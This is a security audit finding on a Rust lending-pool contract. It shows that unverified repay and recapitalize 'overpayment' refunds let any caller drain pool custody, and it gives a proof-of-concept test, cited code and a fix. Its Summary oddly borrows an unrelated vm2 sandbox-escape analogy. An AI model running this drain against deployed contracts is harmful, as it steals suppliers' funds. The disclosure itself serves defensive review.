### Title
Unverified inbound amount lets anyone drain pool custody via `repay`/`recapitalize` overpayment refunds - (File: contracts/pool/src/ops/repay.rs)

### Summary
The vm2 report's root cause is a sanitizer that recursively covers some nested channels (`SuppressedError`, `AggregateError`) while leaving a newly added channel (`Error.cause`) completely unchecked, letting an unsanitized powerful value escape to the sandbox. The same shape exists in the pool: the repay leg carefully accounts for debt-share burns but never verifies that the declared inbound `amount` was actually transferred in before refunding the "overpayment" out of real token custody. The refund channel is the unsanitized `.cause`.

### Finding Description
`ops::repay::apply` documents the assumption "The controller transfers the repay amount into the pool before this call" and then unconditionally executes `outcome.cache.transfer_out(payer, outcome.overpayment)` — a real token transfer back to the caller [1](#0-0) . Inside `accounting`, `cache.resolve_repay(amount, position)` splits the declared `action.amount` into `burned` shares and `overpayment` purely from book state; when the market carries no debt the entire declared amount becomes `overpayment`, `net_repay` is zero, and the `RepayRoundsToZeroShares` assert passes on its `net_repay == 0` disjunct [2](#0-1) . No balance-delta or received-amount check exists anywhere in the leg — unlike `transfer_amount_measured`, which the controller uses for liquidation pulls precisely to credit only tokens actually received [3](#0-2) .

The same gap exists in `ops::recapitalize::apply`, whose excess-over-shortfall refund also "does not debit `cash` or pass `require_reserves`," as the repo's own test notes [4](#0-3) .

### Impact Explanation
Theft of user funds. An unprivileged address calls `pool.repay(payer, PoolAction{hub_asset, amount = pool_balance})` on any market with zero outstanding debt. The full declared amount is classified as overpayment and transferred from pool custody to `payer`, while the cash/borrowed book is untouched. Repeating per market drains every token the pool holds — direct theft of all suppliers' underlying. The existing test `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` demonstrates exactly this: a payer that transferred nothing receives the entire custody balance [5](#0-4) . `recapitalize` offers the same primitive on markets where the reported shortfall is smaller than the declared amount.

### Likelihood Explanation
Certain. The path requires no privileged role, no oracle manipulation, and no timing: only a direct call to the pool's `repay` (or `recapitalize`) entrypoint with an attacker-generated `payer` address and a large `amount`. The prerequisite is merely that the pool's repay leg does not authenticate that the caller is the controller and does not measure the inbound transfer — both confirmed by the harness test, which calls `repay` with a freshly generated `payer` and asserts custody is drained [6](#0-5) .

### Recommendation
Verify receipt before refunding. Either (a) require that repay/recapitalize callers are the controller (which prefunds), or (b) measure the pool's balance delta for `hub_asset.asset` at the start of the leg and cap `amount` at `min(declared, measured_received)` before `resolve_repay` runs — the same `transfer_amount_measured` discipline the controller applies on its pull side. Apply the identical fix to `ops::recapitalize::apply`. Add a regression asserting `cash`/`borrowed` conservation when repay is invoked with no preceding inbound transfer.

### Proof of Concept
Existing in-repo PoC, `contracts/pool/tests/flows.rs` [7](#0-6) :

```rust
let t = TestSetup::new();
let token = token::Client::new(&t.env, &t.asset);
let payer = Address::generate(&t.env);          // unprivileged, unfunded

let custody_before = token.balance(&t.pool);
// No transfer into the pool; market has zero debt.
let credited = t.client()
    .repay(&payer, &t.ract(0, custody_before))  // declared amount = full custody
    .get_unchecked(0)
    .actual_amount;

assert_eq!(credited, 0);                         // no debt retired
// assert_unfunded_refund_drained_custody: token.balance(payer) == custody_before
```

The same sequence on each listed market empties the pool of supplier funds.

### Citations

**File:** contracts/pool/src/ops/repay.rs (L25-34)
```rust
pub(crate) fn apply(
    env: &Env,
    payer: &Address,
    action: &PoolAction,
) -> (PoolPositionMutation, MarketStateSnapshot) {
    let outcome = accounting(env, action);

    outcome.cache.transfer_out(payer, outcome.overpayment);
    (outcome.mutation, outcome.snapshot)
}
```

**File:** contracts/pool/src/ops/repay.rs (L40-55)
```rust
pub(crate) fn accounting(env: &Env, action: &PoolAction) -> RepayOutcome {
    let (mut cache, position) = ops::load_leg(env, action);
    let amount = action.amount;

    let (burned, overpayment) = cache.resolve_repay(amount, position);
    let net_repay = amount
        .checked_sub(overpayment)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));
    assert_with_error!(
        env,
        net_repay == 0 || burned.raw() > 0,
        GenericError::RepayRoundsToZeroShares
    );

    let position = position.checked_sub(env, burned);
    cache.burn_debt(burned);
```

**File:** contracts/controller/src/positions/liquidation/apply.rs (L57-65)
```rust
        // Credit only tokens received by the pool.
        let received = payments::transfer_amount_measured(
            env,
            &entry.hub_asset.asset,
            liquidator,
            &pool_addr,
            pull,
            GenericError::AmountMustBePositive,
        );
```

**File:** contracts/pool/tests/flows.rs (L3578-3588)
```rust
/// The refund gap is not specific to `recapitalize`. Two pool legs refund an
/// excess derived from a declared inbound amount, not from the cash book:
/// `ops::recapitalize::apply` (the excess over the shortfall) and
/// `ops::repay::apply` (the excess over the debt). Neither refund debits `cash`
/// or passes `require_reserves`.
///
/// A repay against a market with no debt makes the entire declared amount an
/// overpayment: `current_debt_ceil` is zero, so `resolve_repay` takes the
/// full-close branch and `net_repay` is zero. The `RepayRoundsToZeroShares`
/// assert in `ops::repay::accounting` passes on its `net_repay == 0` disjunct,
/// and the whole amount is refunded out of real custody with the book untouched.
```

**File:** contracts/pool/tests/flows.rs (L3589-3611)
```rust
#[test]
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
}
```
